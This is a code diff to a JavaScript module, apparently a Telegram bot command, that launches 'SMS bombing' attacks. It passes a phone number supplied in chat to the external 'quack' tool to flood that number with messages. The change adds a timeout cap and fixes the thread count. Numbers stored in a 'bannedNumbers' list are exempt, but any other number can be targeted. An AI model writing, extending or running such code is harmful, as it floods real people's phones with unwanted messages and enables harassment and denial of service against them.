@@ -6,16 +6,21 @@ module.exports = {
 
         const args = ctx.state.command.splitArgs;
 
-        jmongo.load('bannedNumbers', { number: args[0] }, (result) => {
-            if(result===null){
-                const ls = spawn("quack", ["--tool", "sms", "--target", args[0], "--timeout", args[1], "--threads", args[2]]);
-                ctx.reply(`Started sms bombing on ${args[0]}`);
-                executeBombing(ls);
-            }
-            else{
-                ctx.replyWithMarkdown(`\`${args[0]}\` is a protected number, it belongs to *${result.name}*`)
-            }
-        })
+        if(parseInt(args[1])>parseInt(process.env.SMS_BOMB_LIMIT)){
+            ctx.reply(`The timeout is too big, current limit is: ${process.env.SMS_BOMB_LIMIT}`)
+        }
+        else{
+            jmongo.load('bannedNumbers', { number: args[0] }, (result) => {
+                if(result===null){
+                    const ls = spawn("quack", ["--tool", "sms", "--target", args[0], "--timeout", args[1], "--threads", "10"]);
+                    ctx.reply(`Started sms bombing on ${args[0]}`);
+                    executeBombing(ls);
+                }
+                else{
+                    ctx.replyWithMarkdown(`\`${args[0]}\` is a protected number, it belongs to *${result.name}*`)
+                }
+            })
+        }
 
         function executeBombing(ls){
             let amount = 0;
